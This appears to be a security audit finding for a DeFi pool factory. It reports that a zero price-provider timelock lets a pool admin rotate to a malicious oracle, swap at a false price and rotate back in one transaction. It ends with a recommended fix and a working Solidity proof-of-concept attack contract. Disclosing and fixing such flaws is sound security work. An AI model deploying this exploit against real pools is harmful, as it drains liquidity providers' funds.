### Title
Zero-Timelock Price Provider Rotation Allows Pool Admin to Atomically Manipulate Swap Price and Drain LP Funds — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory.createPool` accepts `priceProviderTimelock = 0` for mutable-oracle pools without enforcing any minimum delay. When the timelock is zero, `proposePoolPriceProvider` sets `pendingPriceProviderExecuteAfter = block.timestamp`, and `executePoolPriceProviderUpdate`'s guard (`block.timestamp < execAfter`) passes immediately in the same block. A pool admin can therefore atomically rotate to a malicious price provider, execute a swap at the manipulated price, and rotate back — all in a single transaction — draining LP principal with no advance warning.

---

### Finding Description

**Root cause — factory missing minimum-timelock enforcement:**

`createPool` stores the caller-supplied timelock verbatim:

```solidity
// MetricOmmPoolFactory.sol line 164
bool immutablePriceProvider = params.priceProviderTimelock == type(uint256).max;
// ...
// line 213
priceProviderTimelock[pool] = params.priceProviderTimelock;
``` [1](#0-0) [2](#0-1) 

No lower bound is checked for the mutable-oracle path. Any value other than `type(uint256).max` is accepted, including `0`.

**Proposal step — `executeAfter` collapses to `block.timestamp`:**

```solidity
// MetricOmmPoolFactory.sol line 487
uint256 executeAfter = block.timestamp + timelock;   // = block.timestamp when timelock == 0
pendingPriceProvider[pool] = newPriceProvider;
pendingPriceProviderExecuteAfter[pool] = executeAfter;
``` [3](#0-2) 

**Execution step — timelock guard passes immediately:**

```solidity
// MetricOmmPoolFactory.sol line 499
if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(...);
// block.timestamp < block.timestamp  →  false  →  no revert
``` [4](#0-3) 

Because both `proposePoolPriceProvider` and `executePoolPriceProviderUpdate` are individually `nonReentrant` (transient guard resets after each call returns), a contract can call them **sequentially** in the same transaction without triggering the guard.

**Provider validation is token-only:**

```solidity
// MetricOmmPoolFactory.sol lines 541-545
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1)
        revert PriceProviderTokenMismatch();
}
``` [5](#0-4) 

No price-range, implementation, or oracle-source check is performed. A malicious provider that returns the correct token addresses but an arbitrary bid/ask passes validation.

**Swap uses the active provider at call time:**

```solidity
// MetricOmmPool.sol line 804-812
function _getBidAndAskPriceX64() internal returns (uint128 bidPriceX64, uint128 askPriceX64) {
    address activePriceProvider = _resolvedPriceProvider();
    try IPriceProvider(activePriceProvider).getBidAndAskPrice() returns (uint128 bid, uint128 ask) { ... }
}
``` [6](#0-5) 

Whatever provider is active at swap time determines the execution price.

**Historical context — M01 fix is incomplete:**

The project's own audit findings document records that the original finding "Admin can arbitrarily change the pool priceProvider" was fixed by adding the timelock flow. However, the fix does not enforce a minimum timelock value, leaving the protection nullified when `priceProviderTimelock = 0`. [7](#0-6) 

---

### Impact Explanation

The pool admin can atomically:
1. Deploy a malicious `IPriceProvider` returning correct tokens but a price far from market (e.g., bid/ask shifted 5%).
2. Call `proposePoolPriceProvider(pool, maliciousProvider)` — sets `executeAfter = block.timestamp`.
3. Call `executePoolPriceProviderUpdate(pool)` in the same transaction — guard passes, pool now uses malicious provider.
4. Call `pool.swap(...)` — swap executes at the manipulated price, extracting LP funds equal to the price delta × volume.
5. Call `proposePoolPriceProvider(pool, originalProvider)` + `executePoolPriceProviderUpdate(pool)` — restores original provider, erasing evidence.

All five steps execute atomically. LPs have no opportunity to exit. The loss is bounded only by pool depth and the magnitude of the price manipulation. This is a **direct loss of LP principal** with no protocol-level guard preventing it.

---

### Likelihood Explanation

- **Trigger**: Pool admin (semi-trusted, not fully trusted). The admin is explicitly scoped as "semi-trusted only inside caps and timelocks" — operating with a zero timelock is outside that boundary.
- **Precondition**: Pool created with `priceProviderTimelock = 0`. The factory imposes no minimum, so any pool creator can produce this configuration.
- **Complexity**: Low — requires deploying a one-function malicious provider contract and a sequencing contract; no flash loan or MEV infrastructure needed.
- **Detectability**: The attack is atomic and leaves no pending state; on-chain forensics would require comparing swap prices against external oracle data.

---

### Recommendation

Enforce a minimum timelock for mutable-oracle pools in `createPool`:

```solidity
uint256 internal constant MIN_PRICE_PROVIDER_TIMELOCK = 1 days;

// in _validatePoolParameters or createPool:
if (params.priceProviderTimelock != type(uint256).max &&
    params.priceProviderTimelock < MIN_PRICE_PROVIDER_TIMELOCK) {
    revert TimelockTooShort();
}
```

Additionally, consider re-validating the provider against a price-range guard (e.g., comparing its quote against a secondary reference) at `executePoolPriceProviderUpdate` time, so a malicious provider cannot pass the token-only check.

---

### Proof of Concept

```solidity
// MaliciousProvider.sol — passes _validatePriceProvider, returns manipulated price
contract MaliciousProvider is IPriceProvider {
    address public token0;
    address public token1;
    uint128 public bid;
    uint128 public ask;
    constructor(address t0, address t1, uint128 b, uint128 a) {
        token0 = t0; token1 = t1; bid = b; ask = a;
    }
    function getBidAndAskPrice() external returns (uint128, uint128) { return (bid, ask); }
}

// AttackContract.sol
contract AttackContract is IMetricOmmSwapCallback {
    IMetricOmmPoolFactory factory;
    IMetricOmmPool pool;
    address originalProvider;
    MaliciousProvider malicious;

    function attack() external {
        // Step 1: propose malicious provider (timelock == 0 → executeAfter = block.timestamp)
        factory.proposePoolPriceProvider(address(pool), address(malicious));
        // Step 2: execute immediately (block.timestamp < block.timestamp is false)
        factory.executePoolPriceProviderUpdate(address(pool));
        // Step 3: swap at manipulated price — pool calls malicious.getBidAndAskPrice()
        pool.swap(address(this), true, 1_000_000e18, 0, "", "");
        // Step 4: restore original provider
        factory.proposePoolPriceProvider(address(pool), originalProvider);
        factory.executePoolPriceProviderUpdate(address(pool));
    }

    function metricOmmSwapCallback(int128 amount0Delta, int128, bytes calldata) external {
        // pay token0 input
        IERC20(pool.token0()).transfer(address(pool), uint256(int256(amount0Delta)));
    }
}
```

With `priceProviderTimelock = 0` and a malicious provider quoting a 5% lower ask price, the attacker receives 5% more token1 per unit of token0 than the fair market rate, draining that surplus directly from LP balances.

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L164-164)
```text
    bool immutablePriceProvider = params.priceProviderTimelock == type(uint256).max;
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L213-213)
```text
    priceProviderTimelock[pool] = params.priceProviderTimelock;
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L487-490)
```text
    uint256 executeAfter = block.timestamp + timelock;
    pendingPriceProvider[pool] = newPriceProvider;
    pendingPriceProviderExecuteAfter[pool] = executeAfter;
    emit PoolPriceProviderChangeProposed(pool, current, newPriceProvider, executeAfter);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L497-503)
```text
    uint256 execAfter = pendingPriceProviderExecuteAfter[pool];
    // forge-lint: disable-next-line(block-timestamp) -- timelock enforcement legitimately relies on `block.timestamp`.
    if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(execAfter, block.timestamp);
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, pending);
    IMetricOmmPoolFactoryActions(pool).setPriceProvider(pending);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L804-813)
```text
  function _getBidAndAskPriceX64() internal returns (uint128 bidPriceX64, uint128 askPriceX64) {
    address activePriceProvider = _resolvedPriceProvider();
    try IPriceProvider(activePriceProvider).getBidAndAskPrice() returns (uint128 bid, uint128 ask) {
      if (bid >= ask) revert BidGreaterThanAsk();
      if (bid == 0) revert BidIsZero();
      return (bid, ask);
    } catch (bytes memory reason) {
      revert PriceProviderFailed(reason);
    }
  }
```

**File:** metric-core/docs/AuditFindings.md (L45-69)
```markdown
## M01 - Admin can arbitrarily change the pool priceProvider

### Finding summary

`setPriceProvider()` allowed admin to replace oracle at runtime, and `priceProvider` was returned by `getImmutables()`.

### Resolution

Fixed.

Changes:

- Added constructor config `priceProviderTimelock`.
- Added admin flow:
  - `proposePriceProvider(address newPriceProvider)`
  - `executePriceProviderUpdate()`
- Added events:
  - `PriceProviderChangeProposed(currentPriceProvider, newPriceProvider, executeAfter)`
  - `PriceProviderUpdated(newPriceProvider)`

Behavior now:

- `priceProviderTimelock == type(uint256).max` => immutable mode (admin updates disabled).
- `priceProviderTimelock < type(uint256).max` => mutable mode with delayed execution.
- Price provider used by swaps/reports resolves through timelock mode; active provider is read via `MetricOmmPoolStateView.priceProvider(pool)`.
```
